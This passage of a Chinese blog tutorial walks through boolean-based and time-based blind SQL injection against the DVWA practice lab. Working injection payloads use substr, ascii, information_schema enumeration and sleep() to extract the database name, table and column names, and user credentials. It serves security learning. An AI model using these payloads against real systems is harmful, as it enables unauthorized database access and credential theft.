+<p><strong>方法1</strong>：<em>通过增加数字 97 来逐步缩小范围，直到输入 <code>1&#39; and ascii(substr(database(),1,1))&gt;100#</code>，返回结果 <code>MISSING</code>，说明数据库名的第一个字符的 ASCII 码正好是 100，也就是小写字母 d</em>。</p>
+<p><strong>方法2</strong>：<em>输入</em><code>1&#39; and substr(database(),1,1)=&#39;d&#39;#</code><em>或</em><code>1&#39; and ord(substr(database(),1,1))=100#</code><em>判断当前数据库是第一个字母是不是d</em>。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Eight</strong>.</p>
+<p><strong>方法1</strong>：<em>在文本框中输入 <code>1&#39; and ascii(substr(database(),2,1))&lt;119#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and ascii(substr(database(),2,1))&lt;118#</code>，返回结果 <code>MISSING</code>，说明第二位字符是小写字母 v</em>。</p>
+<p><strong>方法2</strong>.输入<code>1&#39;and substr(database(),2,1)=&#39;v&#39;#</code>或<code>1&#39;and ord(substr(database(),2,1))=118#</code></p>
+<p><font face="黑体">使用相同的方法，最终可以猜测出数据库名为 <code>dvwa</code></font></p>
+<p><font face="黑体"><font face="黑体">过程略</font></font></p>
+<p><strong>Nine</strong>.<em>在文本框中输入 <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=1#</code>，返回结果 <code>MISSING</code>，输入 <code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2#</code>，返回结果 <code>exists</code>，说明当前数据库中存在 2 张表</em>。</p>
+<p><font face="黑体"><font face="黑体">过程略</font></font></p>
+<p><strong>Ten</strong>.<em>在文本框中输入 <code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 9，返回结果 <code>exists</code>。最后得知数据库中第一张表名长度为 9 字符</em>。<font face="黑体"><font face="黑体">过程略</font></font></p>
+<p><font face="隶书">注：select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</font><br><font face="隶书">&#x2F;&#x2F;查询当前数据库中的表名，只取第 0 和第 1 条记录之间的记录，也就是查询出的第一张表名</font></p>
+<p><strong>Eleven</strong>.<em>在文本框中输入 <code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 5，返回结果 <code>exists</code>。最后得知数据库中第二张表名长度为 5 字符</em>。<font face="黑体"><font face="黑体">过程略</font></font></p>
+<p><font face="隶书">注：select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,2</font><br><font face="隶书">&#x2F;&#x2F;查询当前数据库中的表名，只取第 1 和第 2 条之间的记录，也就是查询出的第二张表名</font></p>
+<p><strong>Twelve</strong>.<em>在文本框中输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明第一张表名的第一位字符为小写字母</em> (原理同Six)。<font face="黑体">过程略</font></p>
+<p><strong>Thirteen</strong>.</p>
+<p><strong>方法1</strong>：<em>逐步缩小范围，最终可确认第一张表名的第一位字符为字母 g。输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;97#</code>，猜解第一张表名的第二位字符</em>。</p>
+<p><strong>方法2</strong>：<code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)=&#39;u&#39;#</code>    &#x2F;&#x2F;判断当前数据库的第一个表的第二个字母是不是’u’。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Fourteen</strong>.</p>
+<p><strong>方法1</strong>：<em>输入 <code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1))&gt;97#</code>，猜解第二张表名的第一位字符。重复上述步骤最终可猜解出两个表名分别为 <code>guestbook</code> 和 <code>users</code>。</em></p>
+<p><strong>方法2</strong>：<code>1&#39; and substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1)=&#39;u&#39;#</code>    &#x2F;&#x2F;判断当前数据库的第二个表的第一个字母是不是’u’。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Fifteen</strong>.<em>输入 <code>1 and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=1 #</code>，来猜解 <code>users</code> 表中的字段数量，通过不断加大猜解数字来缩小范围，最终确定字段数量</em>。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Sixteen</strong>.<em>输入 <code>1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=1 #</code>，猜解 <code>users</code> 表中第一个字段名的长度</em>。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Seventeen</strong>.<em>输入 <code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)1,1))&lt;97#</code>，猜解表中第一个字段名的第一位字符内容，原理同上</em>。</p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Eighteen</strong>.<em>最终猜解出存在 <code>user</code> 和 <code>password</code> 字段，原理同上。</em></p>
+<p><font face="黑体">过程略</font></p>
+<p><strong>Nineteen</strong>.<em>输入 <code>1&#39; and ascii(substr((select user from users limit 0,1),1,1))&lt;97#</code>，来猜解第一个用户的用户名的第一位字符内容。最终可以猜解出所有用户的用户名和密码密文，原理同上。</em></p>
+<p><font face="黑体">过程略</font></p>
+<h3 id="延时型盲注"><a href="#延时型盲注" class="headerlink" title="延时型盲注"></a>延时型盲注</h3><p><strong>one</strong> .<em>在文本框输入 <code>1&#39; and sleep(5)#</code>，页面响应有明显延时，输入 <code>1 and sleep(5)</code>，页面响应迅速，说明该注入点为字符型</em>。</p>
+<p><strong>Two</strong> .<em>在文本框输入 <code>1&#39; and if(length(database())=1,sleep(5),1)#</code>，页面没有延时，说明 <code>length(database())=1</code> 结果为假，当前数据库名长度不为 1；逐步增加猜测数字，直到输入 <code>1&#39; and if(length(database())=4,sleep(5),1)#</code>，页面延时，说明当前数据库名长度为 4</em>。</p>
+<p><strong>Three</strong> .<em>在文本框输入 <code>1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#</code>，页面延时；输入 <code>1&#39; and if(ascii(substr(database(),1,1))&lt;9122,sleep(5),1)#</code>，页面没有延时，说明当前数据库名第一个字符为小写字母，原理同布尔型盲注。逐渐缩小猜解范围，页面有延时说明猜解正确，页面无延时说明猜解错误，最终可猜解出数据库名第一个字符内容为 d</em>。</p>
+<p><em>判断当前数据库长度</em>：<code>1&#39; and not if((select length(database())=4),sleep(5),0)#</code></p>
+<p><strong>Four</strong> .<em>后续步骤思路与布尔型盲注一致，只需要按照语法把要猜解的条件代入，再根据页面响应是否出现延时来判断构造的 SQL 注入语句是否成立，就可以逐步猜解出需要查询的数据库信息</em>。<font face="黑体">过程略</font></p>
+<p><font face="隶书">语法：1’ and if (要猜解的条件,sleep(5),1)#  </font><br><font face="隶书">&#x2F;&#x2F;判断，如果要猜解的条件成立，则返回 sleep(5)，延时 5 秒；不成立则返回数字 1</font></p>
+<br />
+
+<br />
+
+<p>【转载文章】</p>
+<p>【1】<a target="_blank" rel="noopener" href="http://www.dengfm.com/15621247896045.html">邓大佬-|在线文档库</a></p>
+</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>SQL注入</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="http://www.zsss.cf/2022/10/19/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/">http://www.zsss.cf/2022/10/19/SQL注入攻击实战/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>半岛铁盒</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-10-19</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-11-24</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">网络安全技术</a></div><div class="post_share"><div class="social-share" data-image="/images/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/imgnew/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/imgnew/wechat.jpg" alt="Wechat"/></a><div class="post-qr-code-desc">Wechat</div></li><li class="reward-item"><a href="/imgnew/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/imgnew/alipay.jpg" alt="Alipay"/></a><div class="post-qr-code-desc">Alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/13/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/"><img class="prev-cover" src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/01.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web爆破攻击实战</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/19/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BSDN%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/"><img class="next-cover" src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B47.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网络技术大赛SDN训练题库</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">半岛铁盒</div><div class="author-info__description">追求源于热爱，极致源于梦想</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">118</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:AliZhs@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://wpa.qq.com/wpa_jump_page?v=3&amp;uin=2782046497&amp;site=qq&amp;menu=yes%20%20%20eg%EF%BC%9Ahttp://wpa.qq.com/msgrd?v=3&amp;uin=1186154608&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><img src="/images/杂图/taikong.svg"></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记"><img src="/images/%E6%9D%82%E5%9B%BE/%E8%A1%A8%E6%83%85%E5%8C%8502.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="学习笔记"/></a><div class="content"><a class="title" href="/2022/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">学习笔记</a><time datetime="2022-11-10T08:05:10.000Z" title="发表于 2022-11-10 16:05:10">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/08/dvwa%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="dvwa之文件上传与文件包含"><img src="/images/dvwa%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/01.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="dvwa之文件上传与文件包含"/></a><div class="content"><a class="title" href="/2022/11/08/dvwa%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="dvwa之文件上传与文件包含">dvwa之文件上传与文件包含</a><time datetime="2022-11-08T11:39:38.000Z" title="发表于 2022-11-08 19:39:38">2022-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/" title="kali之破解主机密码"><img src="/images/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/04.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali之破解主机密码"/></a><div class="content"><a class="title" href="/2022/11/02/kali%E4%B9%8B%E7%A0%B4%E8%A7%A3%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81/" title="kali之破解主机密码">kali之破解主机密码</a><time datetime="2022-11-02T08:36:58.000Z" title="发表于 2022-11-02 16:36:58">2022-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/27/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" title="nmap端口扫描"><img src="/images/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nmap端口扫描"/></a><div class="content"><a class="title" href="/2022/10/27/nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" title="nmap端口扫描">nmap端口扫描</a><time datetime="2022-10-27T06:27:56.000Z" title="发表于 2022-10-27 14:27:56">2022-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/19/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BSDN%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/" title="网络技术大赛SDN训练题库"><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B47.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络技术大赛SDN训练题库"/></a><div class="content"><a class="title" href="/2022/10/19/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9BSDN%E8%AE%AD%E7%BB%83%E9%A2%98%E5%BA%93/" title="网络技术大赛SDN训练题库">网络技术大赛SDN训练题库</a><time datetime="2022-10-19T10:15:46.000Z" title="发表于 2022-10-19 18:15:46">2022-10-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 半岛铁盒</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Carpe Diem.<p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="7402268081" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div> <canvas id="universe"></canvas> <script defer src="/js/universe.js"></script> <script src="//code.bdstatic.com/npm/leancloud-storage@4.12.0/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '113.34532,23.15624';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/02/15/爬山记/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/images/日照天台山/tian002.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-02-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/02/15/爬山记/&quot;);" href="javascript:void(0);" alt="">爬山记</a><div class="blog-slider__text">日照天台山</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/02/15/爬山记/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/10/09/打卡山东博物馆/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/images/打卡山东博物馆/03.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-10-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/10/09/打卡山东博物馆/&quot;);" href="javascript:void(0);" alt="">打卡——山东博物馆</a><div class="blog-slider__text">山东博物馆</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/10/09/打卡山东博物馆/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2022/03/11/2022运动记录/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="/images/2022.运动记录/强风吹拂.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-03-11</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2022/03/11/2022运动记录/&quot;);" href="javascript:void(0);" alt="">2022.运动记录</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2022/03/11/2022运动记录/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
